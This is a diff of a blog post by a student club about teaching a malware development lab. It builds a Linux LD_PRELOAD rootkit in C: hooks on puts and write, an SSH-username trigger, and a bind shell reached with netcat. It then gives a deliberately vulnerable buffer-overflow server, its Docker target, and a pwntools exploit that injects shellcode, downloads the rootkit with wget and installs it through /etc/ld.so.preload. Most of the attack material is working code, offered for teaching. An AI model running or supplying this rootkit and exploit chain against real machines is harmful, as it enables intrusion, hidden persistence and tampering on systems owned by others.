@@ -1,53 +1,67 @@
 # Teaching CS Students the secrets behind (ethical) Malware Engineering
 
-Author: Rory Hemmings
+Author: Rory Hemmings,
 June 7th 2023
 
 **Disclaimer**
 > I am not an expert in this topic, and this project is meerly my interpretation/attempt at rootkit development. If you have any suggestions for improvement, please suggest them on github issues in this [repo](https://docs.google.com/presentation/d/1U2sHxWP64e9oxL_PAg-F9cti82FOHWIan8AGZFJG8Ec/edit?usp=drive_link).
 
-For ACM Cyber this spring quarter, we decided to breanch off from our workshop/lecture based style of teaching to try something more practical. To achieve this we offered a "Malware Development Lab" and the "Secure OS development Lab" 2 "Cyber Labs" instead. Both were inteded to be low level cyber-security projects allowing people to get their hands dirty on the development side of cyber. This post details the development process, plans, and results of this quarters Malware Lab. 
+For ACM Cyber this spring quarter, we decided to breanch off from our workshop/lecture based style of teaching to try something more practical. To achieve this we offered a "Malware Development Lab" and the "Secure OS development Lab" instead. Both were inteded to be low level cyber-security projects allowing people to get their hands dirty with practical cybersecurity from a development point of view. This post details the cirriculum, outcomes, and results of this quarters Malware Lab. 
 
 ## Lab Objectives
 
 Overall we had three major objectives in teaching this lab.
 
-1. Develop fully functional rootkits using low level c
-2. Exploit a vulnerability to install our rootkit thus gaining persistent access 
-3. Teach students how to apply the fundamentals behind operating systems and network programming to practical malware. 
+1. Develop functional linux rootkits using c
+2. Exploit a toy vulnerability to install our rootkit and gain persistent access 
+3. Teach students how to apply operating systems and network programming fundamentals to create malware. 
 
-However, we required little previous knowledge of these subject matters, and thus we had to fit all of these objectives into a total of 10 hours.
+We aimed to require little previous knowledge regarding these subject matters, a tough task given we only had 10 hours of total workshop time.
 
-As it relates to the exact architecture of the rootkits, we took heavy inspiration from the one developed in this [post](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/). If you are intereseted in what we did, I **highly recommend** you read this post as it contains great in depth technical explanations of many of the features we added.
+The base architecture of our rootkits took *heavy* inspiration from the one developed in this [post](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/). If you're intereseted in developing your own rootkit, I **highly recommend** reading this post as it contains great in-depth technical explanations of many of the features we added.
 
-This included two basic features:
+Our base architecutre (linux specific) was composed of two features:
 1. A trigger mechanism that calls a function upon ssh login attempts with a trigger username
 2. A forked bind shell process started by the trigger mechanism
 
 Additionally, I added some features similar to those detailed in the post including ls and netstat evasion.
 
-In the end these base features gave us a malicious LD_PRELOAD rootkit that provided persistent shell access while hiding from ls and netstat.
+In the end these base features resulted in a malicious LD_PRELOAD rootkit that provided persistent shell access while hiding from ls and netstat.
 
 ## Cirriculum
 
-Our approach was to spend the first three weeks having our attendees developing the base features (trigger, bind shell, exploit script), and then give them the remaining couple of weeks to add their own features. Finally at the end of the quarter we provided them a target server they were tasked to exploit, and then demo their features in front of an audience at our end of quarter symposium.
+In total we had 5 workshops throughout the quarter. Our approach was to spend the first three weeks having our attendees develop the base features (trigger, bind shell, exploit script), and then give them the remaining two of weeks to add their own features. Finally at the end of the quarter we provided them target servers which they were tasked with exploiting to demo their features in front of an audience at our end of quarter symposium.
 
 Our cirriculum followed this structure:
 
-* Week 3: OS concepts + system call hooking + trigger mechanism
-* Week 4: networking + bind shell
+* Week 3
+  - VM setup
+  - OS concepts
+  - System call hooking
+  - Trigger mechanism
+* Week 4:
+  - Networking
+  - Bind shell
 * Week 5: break for midterms
-* Week 6: buffer overflows + exploit script
-* Week 7: industry talk + overview of possible features
+* Week 6:
+  - Buffer overflows
+  - Exploit script
+* Week 7:
+  - Industry talk
+  - Overview of potential custom features
+  - Begin Development on custom features
 * Week 8: work session
 * Week 9: demos
 
 ## System Call Hooking
 
-The core of the rootkit revolves around one basic principle: System Call Hooking. The basic idea is that we want to insert a thin layer between the user and operating system without the users knowledge. That way we can manipulate the information moving between the user and the operating system.
+At its core, the rootkit revolves around one basic principle: System Call Hooking. The basic idea is that we want to insert a thin layer between the user and operating system without the users knowledge. This way we can manipulate the information moving between the user and the operating system allowing us to inject custom functionality and cover our tracks.
 
 #### System calls 
-In order to do anything from file manipulation, programs make use of syscalls to "ask" the operating system to do things. Take for example the basic c hello work program.
+
+In order to use any services offered by the operating system, programs make use of syscalls to essentially "ask" the operating system to do things. This stands in contrast to normal library function calls as the user program has no control over the CPU during syscall execution.
+
+An example of an operating system service is file manipulation, since the filesystem and processes are managed by the linux kernel in our case. For example, let us examing a basic hello world program in C.
 
 ```c
 #include <stdio.h>
@@ -59,7 +73,7 @@ int main(int argc, char** argv)
 }
 ```
 
-This program uses the `printf` function, which writes `"Hello World\n"` to standard output. However, writing to standard output is technically file manipulation, and thus it requires operating system intervention. This can be illustrated by looking at the generated machine code.
+This program uses the `printf` function from `<stdio.h>`, to write `"Hello World\n"` to standard output. However, writing to standard output is technically file manipulation, and thus it requires operating system intervention. This can be illustrated by looking at the generated `x86-64` machine code.
 
 ```s
 0000000000001149 <main>:
@@ -77,7 +91,7 @@ This program uses the `printf` function, which writes `"Hello World\n"` to stand
     1171:	c3                   	ret
 ```
 
-In this case, it uses the `puts` system call (instruction at 0x1166). This system call simply takes a string as input and writes it to stdout.
+In this case, it uses the `puts` system call (instruction at `0x1166`). This syscall simply takes a string as input and writes it to `stdout`.
 
 #### Shared Libraries
 
@@ -85,21 +99,21 @@ As you can imagine, this system call is very widely used. Because of this, it wo
 
 Instead it's more efficient to save a single copy of `puts` somewhere on the system, and have all programs on the system share that copy. In facts its even better if we bundle all of the commonly used functions and save them in one place so that all our programs can simply refer to the copy. This process is known as dynamic linking as this library is linked at run time as opposed to compile time (static linking). 
 
-In this case, the library is called a shared library. `puts` is stored in libc (`/lib/libc.so.6`), which contains all of the c functions in the standard library.
+In this case, the library is called a shared library. `puts` is stored in libc (`/lib/libc.so.6`), which contains all of the C functions in the standard library.
 
 #### ld.so.preload
 
-Something interesting about dynamic linking is that you can infuence how it works using environment variables. One such variable is `LD_PRELOAD`. Setting this variable allows you to change the order in which dynamic libraries are loaded. Specifically, it contains the path of shared libraries you want to load first.
+Something interesting about dynamic linking on Linux is that you can infuence how it works using environment variables. One such variable is `LD_PRELOAD`. Setting this variable allows you to change the order in which dynamic libraries are loaded at runtime. Specifically, it contains the path of shared libraries you want to load first.
 
-This is extremely powerful because it allows us to effectively overwrite the code for libc system calls.
+We can exploit this by writing our own shared library, and adding its name to the `LD_PRELOAD` variable. This way, functions from our library will be loaded before those in `libc`. Critically, if we write functions with equivalent signatures to those in `libc`, ours will be loaded first and thus take priority over those in `libc`.  This is extremely powerful because it means we can effectively overwrite the code for any libc system call globally on the system.
 
 > Note, you can also write to the file `/etc/ld.so.preload` to achieve a more permenant effect
 
 #### System Call Hooking
 
-In essence, a syscall hook is simply a wrapper around an existing syscall. Generally we use this to filter the incoming or outgoing data from a system call. As syscalls act as a portal into the operating system, this means that we can control the traffic between user programs and the OS.
+In essence, a syscall hook is simply a wrapper around an existing syscall. Generally we use this to filter the incoming or outgoing data from a real system call. As syscalls act as a portal into the operating system, this means that we can control the traffic between user programs and the OS.
 
-Below is an example of how we can hook the `puts` syscall to replace the message "cat" with the word "dog"
+Below is an example of how we can hook the `puts` syscall to replace the message "cat" with the message "dog".
 
 ```c
 /* Hooked Syscall - overrides actual puts syscall */
@@ -110,17 +124,17 @@ int puts(const char *message)
 
 	/* 
 	 * 1. Get address of next "puts" symbol from dynamic linker
-	 * 2. assign new_puts to point to it
-	 * 3. Now new_puts points to the REAL puts syscall
+	 * 2. assign real_puts to point to it
+	 * 3. Now real_puts points to the REAL puts syscall
 	 */
 	real_puts = dlsym(RTLD_NEXT, "puts");
 
-	/* If write is attempting to write our target string,
+	/* If puts is attempting to write our target string,
 	 	 inject our subsequent payload instead */
 	if (strcmp(message, "cat") == 0)
 		return real_puts("dog");
 
- 	/* Otherwise simply forward call to REAL puts */
+ 	/* Otherwise simply forward call to REAL puts (this is the case for the vast majority of traffic) */
 	return real_puts(message);
 }
 ```
@@ -142,34 +156,44 @@ dog
 $
 ```
 
-As we can see, we have directly manipulated the operation printf call. The program is correctly using the `printf` function, however it is not behaving as expected.
+As you can see, we have indirectly manipulated printf's behavior. The program is correctly using the `printf` function, however it is not behaving as expected.
 
-At the heart of this example is the `dlsym` call. While it looks complicated, it simply retrieves the next dynamically linked occurance of the `puts` symbol. Since our library was loaded before libc, the next occurance is the original `puts` syscall in libc. Since `real_puts` is a function pointer, this line simply initializes `real_puts` to the address of the real `puts` function. This allows us to "wrap" the `puts` syscall with our own "filter".
+At the heart of this example is the `dlsym` call. While it looks complicated, it simply retrieves the next dynamically linked occurance of the `puts` symbol. Since our library was loaded before libc, the next occurance is the original `puts` syscall in libc. Since `real_puts` is a function pointer, this line simply initializes `real_puts` to the address of the real `puts` function. We can now use `real_puts` freely within our wrapper.
 
-Since our library is loaded before libc, any program calling `printf`, and be extension `puts`, will actually be calling our `puts` function. What this means is that any program on the entire system that wants to print "cat" to stdout, will actually end up printing "dog" instead. Critically however, any call to puts that isn't literally printing "cat" is left completely untouched. 
+Since our library is loaded before libc, any program calling `printf`, and by extension `puts`, will actually be calling our `puts` function. This means that any program on the entire system that wants to print "cat" to stdout, will actually end up printing "dog" instead. Critically however, any call to puts that isn't literally printing "cat" is left completely untouched. 
 
-While this example is relatively inocuous, it gives us a window into the potential of this feature. Not only can it be used to arbitrarily execute code, but it can also be used to cover up evidence of the rootkit entirely. 
+While this example is relatively inocuous, it gives us a glimpse into the potential host of features we could develop. Not only can it be used to arbitrarily execute code, but it can also be used to cover up evidence of the rootkit entirely as we can literally control exactly what the operating system is telling the user. The user could be attempting to detect the rootkit and the OS could be screaming for help, but we can easily redirect those calls for help into the void, leading the user into a false sense of security. 
+
+> Note that this program will only replace **exactly** the message "cat" with the message "dog". If someone writes "I like cats", it will still print "I like cats" since `strcmp` checks for an exact match with "cat". Qualities like this are actually rather important when it comes to designing a rootkit since all the global `puts` traffic will be routed through your function, and the vast majority of traffic shouldn't trigger your rootkit features to preserve discretion.
 
 #### Trigger Mechanism
 
-ssh logs
-write syscall
+For our rootkits, the goal was to gain persistent access to a machine. To achieve this, you need to open some sort of backdoor shell on command. This requires a built in trigger mechanism to open a shell.
+
+In our case, we are looking to attack a linux machine that presumably has ssh installed. While there are many ways of implementing this, we again took *heavy* inspiration from the aformentioned blog post. Specifically, the ssh feature we aimed to exploit was the logging mechanism.
+
+Every time that a user attempts to connect to a machine on ssh, the ssh daemon logs the attempt along with the username and some other information to `/var/log/auth.log`. Critically this information is logged whether the attempt is successful or not and the ssh daemon uses the `write` system call to write to the file.
+
+We can leverage this feature and hook the write system call to trigger a shell when a user attempts to login with a specific username. This is great as it will only trigger if a user attempts to log in with a trigger username. In all other cases ssh will function normally.
+
+Here is the code for the trigger.
 
 ```c
 #define TRIGGER_USERNAME "joebruin"
 
 void start_bind4()
 {
-  printf("The Hacking Has Begun\n");
+	/* Filled in with bind shell code later on */
 }
 
+/* Function defintion matching that of the write syscall */
 ssize_t write(int fildes, const void *buf, size_t nbytes) {
 	ssize_t (*real_write) (int fildes, const void *buf, size_t nbytes);
 	ssize_t result;
 
 	real_write = dlsym(RTLD_NEXT, "write");
 
-	/* Message doesn't conain trigger */
+	/* Continue normally if message doesn't conain trigger */
 	if (strstr(buf, TRIGGER_USERNAME) == NULL) {
 		return real_write(fildes, buf, nbytes);
 	}
@@ -185,11 +209,15 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) {
 }
 ```
 
+> Note, in reality you should probably use a more complicated trigger than joebruin, as this hook will actually trigger whenever any global program tries to write something containing "joebruin" to any file. As it is short and comprised of actual words, its likely that this could trigger unintentionally. For our actual rootkit, we made the trigger username a long string of base64 text, where unintentional triggering is extremely unlikely.
+
 ## Bind Shell
 
 At this point, we had single hook that called a function when a user attempted to ssh into the server with a trigger username. Given the next goal for our rootkit was persistent access, we decided to write code to set up a bind shell whenever the user used the trigger mechanism.
 
 ```c
+#define BIND_PORT XXXXX
+
 void start_bind4()
 {
 	struct sockaddr_in addr;
@@ -223,30 +251,275 @@ The first several statments are fairly standard networking C code. They simply c
 
 Next, the program forks, creating a copy of the running process (the ssh daemon in this case). Next the function `dup2` overwrites the stdout, stdin, and stderr file descriptiors with the socket, effectively rerouting stdin, stdout, and stderr to the connection. Finally, the program execs a shell, replacing the currently running process (forked version) with the shell program.
 
-In the end this spawns a separate shell process with its input and output routed to the client.
+In the end this spawns a separate shell process with its input and output routed to the client socket.
 
-The client can then connect to this shell using netcat.
+After attempting an ssh login with the trigger usename, the attacker can then connect to this shell using netcat.
 ```
 nc TARGET_ADDRESS BIND_PORT
 ```
 
-The reason we call it a bind shell is because we bind the socket to the target's address. This indicates that the target acts as the server, and the client (attacker in this case) connects to the target. Conversely, we could have created a reverse shell where the target acts as the client that connects to the attackers Command and Control server to control the target.
+> Note, the reason we call it a bind shell is because we bind the socket to the target's address. This indicates that the target acts as the server, and the client (attacker in this case) connects to the target. Conversely, we could have created a reverse shell where the target acts as the client that connects to the attackers Command and Control server to control the target.
 
-## Target Environment
+## Target
 
-docker container on aws
-running ssh
-running apache
-running target program
-objective, break into target program, get persistent access, modify website
+Now that we have the base features developed, it was time for exploitation. While our original goal was to exploit an old CVE, we ended up going with a toy buffer overflow vulnerability and homerolled exploit script for educational purposes.
+
+> Note for future workshops: In hindsight, we probably should have gone with a CVE as to use msfvenom since it would have been much easier to explain and more practically useful, however both approaches have pros and cons.
+
+I won't go to in depth into the vulnerability or mechanics behind how buffer overflows work since that is a little out of scope of this post, but there are plenty of resources online if you are interested.
+
+### Target Machine
+
+The target machine had a couple characteristics. It was a web server hosting a static http page via apache on an Ubuntu system. Additionally, it was running sshd, and the vulnerable target program detailed in the next section.
+
+The static webpage hosted was is shown above.
+![Website](imgs/website.png)
+
+To configure and run this target machine we used docker to setup several target machines.
+
+Here is the Dockerfile used to configure our machine.
+
+```Dockerfile
+# ASLR must be disabled on host machine
+
+FROM ubuntu:jammy
+
+RUN apt-get update && \
+    apt-get -y dist-upgrade && \
+    apt-get -y install gcc && \
+    apt-get -y install make && \
+    apt-get -y install rsyslog && \
+    apt-get -y install vim && \
+    apt-get -y install python3 && \
+    apt-get -y install python3-pip && \
+    apt-get -y install apache2 sudo && \
+    apt-get -y install openssh-server sudo
+
+RUN pip install pwn
+
+WORKDIR /vuln
+COPY . .
+
+# Configure Static Site
+RUN cp ./site/* /var/www/html/
+
+RUN make target
+RUN chmod 777 target
+RUN chown 0 target
+
+# Expose port for rev shell
+EXPOSE 2002
+
+CMD ["./start.sh"]
+```
+
+Ideally, we would start all of our services in the `Dockerfile`, but doing so is not possible as we can't enable services until after the `Dockerfile` finishes running. This is in line with the philosophy that docker containers should only be running one real task each. However, we are trying to simulate a monolithic server in this case, so we can get arround this by starting the services in `start.sh` instead.
+
+```sh
+#!/bin/sh
+
+# These commands need to be run at runtime (don't work during docker build)
+
+# disable rsyslogd security percautions (so that system logger is run as root)
+sed -i "s/FileOwner syslog/FileOwner root/g" /etc/rsyslog.conf
+sed -i "s/PrivDropToGroup syslog/PrivDropToGroup root/g" /etc/rsyslog.conf
+sed -i "s/PrivDropToUser syslog/PrivDropToUser root/g" /etc/rsyslog.conff
+
+sudo rsyslogd
+service ssh start
+service apache2 start
+
+./target
+```
+
+> You might notice that we are running `rsyslog` as well. This is because docker containers actually have ssh logging indirectly disabled by default. Normally, logging is managed by the syslog service, however this service is started by the init system, which isn't run in docker containers automatically. To get around this we have to start it manually. Additionally we need to configure `rsyslogd` to run as root because it runs as the `rsyslog` user by default for security reasons.
+
+Given this setup the object was to: 
+1. Hijack the target program
+2. Gain persistent access by installing the rootkit
+3. Modify Website, or cause chaos
+
+### Target Binary
+
+Below is the source code for the target binary. Keep in mind that the emphasis of this workshop was on the malware, so in this case the vulnerability was trivial.
+
+```c
+#include <arpa/inet.h>
+#include <dlfcn.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/queue.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define LISTEN_PORT 2000
+
+volatile int server_sockfd;
+volatile int client_sockfd;
+
+void interact()
+{
+    char out[264];
+    char in[256];
+
+	strcpy(out, "Enter your name: ");
+
+    send(client_sockfd, out, strlen(out), 0);
+
+	/* BUFFER OVERFLOW OCCURS HERE */
+    recv(client_sockfd, in, 1024, 0);
+
+    strcpy(out, "Hello: ");
+    strcat(out, in);
+
+    send(client_sockfd, out, strlen(out), 0);
+}
+
+/* Start server and redirect stdin and stdout to socket */
+int setup_server()
+{
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(LISTEN_PORT);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    /* allow reuse of local address */
+    const static int optval = 1;
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    /* bind socket to local address */
+    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+    listen(sockfd, 0);
+
+    return sockfd;
+}
+
+void sighandler(int sig)
+{
+    close(client_sockfd);
+    close(server_sockfd);
+}
+
+int main()
+{
+    signal(SIGINT, sighandler); // used for debugging purposes
+    server_sockfd = setup_server();
+
+    struct sockaddr_in client_addr;
+    unsigned sin_size = 0;
+
+    while (true) {
+        client_sockfd = accept(server_sockfd, (struct sockaddr *) &client_addr, &sin_size); 
+        interact(); 
+        close(client_sockfd);     
+    }
+
+    return 0;
+}
+
+```
+
+As you can see this is a basic program that echos "Hello: *whatever they enter*" in a loop indefinitely. However, in the interact function, it allows the user to enter up to 1024 bytes into a 256 byte buffer. This is a classic buffer overflow.
+
+![target](imgs/target.png)
+
+As you can see the target also had no binary protections, and ASLR was disabled on the target server. Because of this, exploitation was pretty trivial.
 
 ## Exploitation
 
+For exploitation, we used a sort of two stage payload. Essentially, our script would hijack the istruction pointer of the target program, and then start a bind shell on another port. Next the script would connect to that bind shell, and automatically install the rootkit after downloading it from some static server (my personal website in this case).
+
+Since we had several groups, we hosted several target machines and several payloads. Each group was assigned a target number which they would input into this script. Then the script would be configured to attack their target with their payload.
+
+Here is the completed script:
+
+```py
+from pwn import *
+
+'''
+Set the below target number to your assigned target number to automate the installation process
+'''
+target_num = 1
+
+# ---------------------------------
+
+context.arch = 'amd64'
+
+# obtained using gdb
+base_addr = 0x7fffffffea70
+diff = 0x7fffffffdd38 - 0x7fffffffdb20
+
+target_addr = 'mw-demo.roryhemmings.com'
+target_port = target_num*1000 + 1000
+stage_two_port_external = target_num*1000 + 1002
+stage_two_port_internal = 2002
+
+rootkit_download_addr = f'mw-demo.roryhemmings.com/rootkit{target_num}.tz'
+rootkit_filename = f'rootkit{target_num}.tz'
+
+# Set up the connection to the target system
+target = remote(target_addr, target_port)
+
+# Generate the stage 1 shellcode to connect to the target
+stage1_shellcode = shellcraft.amd64.linux.bindsh(stage_two_port_internal, target_addr)
+
+# Assemble and send the stage 1 shellcode to the target system
+assembled_stage1_shellcode = asm(stage1_shellcode)
+
+padding = b'\0' * (diff - 1 - len(assembled_stage1_shellcode))
+raddr = p64(base_addr + 1)
+
+payload = b'\0' + assembled_stage1_shellcode + padding + raddr
+target.send(payload)
+
+# Connect to bind shell and install rootkit
+setup_target = remote(target_addr, stage_two_port_external)
+setup_target.sendline(f'wget {rootkit_download_addr}'.encode('ascii'))
+setup_target.sendline(f'tar -xzf {rootkit_filename}'.encode('ascii'))
+setup_target.sendline('./drop.sh'.encode('ascii')) 	# installs the rootkit
+setup_target.sendline(f'rm {rootkit_filename}'.encode('ascii'))
+setup_target.sendline('rm rootkit.so'.encode('ascii'))
+setup_target.sendline('rm ./drop.sh'.encode('ascii'))
+setup_target.sendline('echo "You have been hacked" > hacked.txt'.encode('ascii'))
+setup_target.recvuntil('...'.encode('ascii'), timeout=1)
+
+setup_target.close()
+target.close()
+
+```
+
+To acutally install the rootkit this script calls another script `./drop.sh`. That script is shown below.
+
+```sh
+#!/bin/bash
+
+LIBNAME=rootkit.so
+LIBPATH="$PWD/$LIBNAME"
+LIBDEST="/lib/$LIBNAME"
+
+mv $LIBNAME $LIBDEST
+echo $LIBDEST > /etc/ld.so.preload
+sudo systemctl restart ssh
+```
+
+It simply moves the rootkit to the `/lib` directory and then adds its path to the `/etc/ld.so.preload`. Next, it restarts `sshd` so that it starts using the `write` system call from `rootkit.so` instead of `libc`.
+
 ## Developed Features
 
-evasion
-javascript injection
-shred
+After each group implemented their base features along with the exploit script, each team got to implement custom features of their choice. Unfortunately we didn't end up having as much time as expected, so the custom features ended up being less so features, and more so post-exploitation demos.
+
+### Evasion
+
+
+### Javascript Injection
+### Shred
 
 ## Complications
 
@@ -255,11 +528,7 @@ we spent more time
 probably better to have bigger groups
 we could cut back on lectures even more
 
-making the docker container more flimsy
-
-## Conclusion
-
-This quarter the malware lab was a major learning experience.
+making the docker container more flimsy - docker is intentionally designed to avoid being exploited in the way we did. However our rootkit would work on a monolithic server.
 
 ## References
 
